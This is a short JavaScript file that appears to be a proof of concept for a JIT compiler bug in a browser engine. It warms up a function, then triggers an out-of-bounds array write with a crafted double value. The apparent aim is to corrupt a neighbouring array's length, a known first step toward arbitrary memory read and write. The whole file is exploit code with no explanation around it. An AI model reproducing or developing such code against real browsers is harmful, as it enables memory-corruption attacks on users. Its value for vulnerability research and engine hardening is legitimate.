var str = "AISpsjFbWLAZEYyNzx8j5yG8cWkK2Mgb";

function go(a, b, c) {
  try {
    for (var v_in in str) {
      try {
        go(undefined, -0, {});
      } catch (e) {}
      try {
        new Uint32Array(41902);
      } catch (e) {}
    }
  } catch (e) {}

  try {
    delete v_in.a;
  } catch (e) {}
}

function opt(arg) {
  let x = arguments.length;
  a1 = new Array(0x10);
  a2 = new Array(2);
  a2[0] = 1.1;
  a2[1] = 1.1;
  a1[(x >> 16) * 0xf00000] = 1.39064994160909e-309; // 0xffff00000000

  go(-0, {}, 23704);
}

var a1, a2;

let small = [1.1];
let large = [1.1, 1.1];
large.length = 65536;
large.fill(1.1);

for (let j = 0; j < 100000; j++) {
  opt.apply(null, small);
}

opt.apply(null, large);
